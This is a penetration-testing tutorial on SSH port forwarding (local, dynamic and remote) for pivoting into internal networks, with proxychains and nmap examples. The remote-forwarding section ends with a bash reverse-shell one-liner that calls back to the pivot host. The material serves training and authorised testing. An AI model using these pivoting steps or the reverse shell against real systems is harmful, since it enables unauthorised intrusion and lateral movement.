---
title: Port Forwarding with SSH
description: Create local, dynamic, and remote port forwards using SSH.
categories: [Tunneling]
tags: [Tunneling, SSH]
weight: 2
---

## What is port forwarding?
Port forwarding is a technique that allows communication requests to be redirected from one port to another. This can be for ports on the same machine, or different machines on the same network.

SSH provides both a secure remote shell for management and secure port-forwarding tunnels. Common TCP forwarding modes are:
- **Local**: Listen on a local port and forward connections to a service reachable from the pivot host.
- **Dynamic**: Create a SOCKS proxy on the local host for compatible TCP applications to reach destinations through the pivot host; this does not add a network route.
- **Remote (reverse)**: Listen on the pivot host and forward connections to a service reachable from the local machine. Other internal hosts can connect if the listener's bind address and server policy permit it.

## Local Port Forwarding
Suppose we have SSH access to a web server that also runs MySQL on `localhost:3306`. We can create a listener on our local machine (port 1234/TCP) that forwards traffic through SSH to `localhost:3306` on the web server. Connecting to this listener then reaches MySQL.

This is called **local port forwarding** and allows access to a service we cannot reach directly but the pivot host can.

![](/img/ssh_port_forward/local.png)

To do this, we use the `-L` option to specify a local port forward.
```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.24
```
- Port forward is specified in the format of `<local_listener_port>:<target_address>:<target_port>`

To specify multiple port forwards, simply add more `-L <local_listener_port>:<target_address>:<target_port>` to the `ssh` command:
```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.24
```

## Dynamic Port Forward
Suppose the web server has interfaces connected to an internal network and the demilitarized zone (DMZ). We can use SSH **dynamic port forwarding** to reach internal hosts by creating a **SOCKS listener** on the local machine. SSH forwards the requested TCP connections through the pivot host.

![](/img/ssh_port_forward/dynamic.png)

The `ssh` command for creating a dynamic port forward uses the `-D` option. This starts a SOCKS listener on the port specified (9050) in the option on the local machine.
```bash
ssh -D 9050 ubuntu@10.129.202.24
```

To route compatible clients through the SOCKS listener, configure the `[ProxyList]` section in `/etc/proxychains.conf` (or `/etc/proxychains4.conf`, depending on the installation). Replace unwanted proxy entries with:
```txt
socks4 	127.0.0.1 9050
```

Now, we simply prepend `proxychains` to compatible dynamically linked TCP clients. Raw-packet scans, ICMP and UDP do not pass through it. Use a TCP connect scan (`-sT -Pn -n`) for Nmap; the captured legacy discovery example below is not a general host-discovery method.
```shell-session
╭─brian@rx-93-nu ~
╰─$ proxychains nmap -v -sn 172.16.6.1-200

ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:30 EST
Initiating Ping Scan at 12:30
Scanning 10 hosts [2 ports/host]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.6.2:80-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.6.5:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.6.6:80-<--timeout
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0

<SNIP>
```
- If we want to suppress the output from `proxychains`, prepend the command we want to run with `proxychains -q` instead.

## Remote Port Forwarding
As pentesters or red teamers, we may want to expose a service on our attacker machine to a host on an internal network that our machine can't reach directly:
- Reverse shell listener
- File transfer service (HTTP, SMB, etc.)

To accomplish this, we can make use of SSH **remote port forwarding**, which starts a listener on a specified port on the pivot host, and all traffic from the internal hosts to that port would be forwarded to a specific port on the attacker machine.
- Therefore when creating/generating reverse shell payloads, use the **internal address of the pivot host** as the callback address instead of the address of the attacker machine.

![](/img/ssh_port_forward/remote.png)

The `ssh` command uses `-R` to create a remote port forward in the format `<pivot_internal_address>:<listener_port>:<forward_address>:<forward_port>`.
```bash
ssh -R 172.16.6.129:8000:127.0.0.1:8000 ubuntu@10.129.202.24
```

The SSH server must allow remote forwarding (`AllowTcpForwarding yes` or `remote`) and permit the non-loopback bind with `GatewayPorts clientspecified` (or `yes`, which binds all interfaces). The default `GatewayPorts no` restricts the listener to loopback. The pivot firewall must also allow the listening port; the destination `127.0.0.1:8000` is reached from the SSH client machine.

To have the internal host reach back to the attacker machine, specify the **internal address of the pivot host** instead of the address of the attacker machine, and specify the pivot host listener port instead of the port of the reverse shell listener on the attacker machine. Below is an example of a Bash payload to run on a Linux machine on the internal network.
```bash
/bin/bash -i >& /dev/tcp/172.16.6.129/8000 0>&1
```

## References
- [OpenSSH ssh(1)](https://man.openbsd.org/ssh.1)
- [OpenSSH sshd_config(5)](https://man.openbsd.org/sshd_config.5)
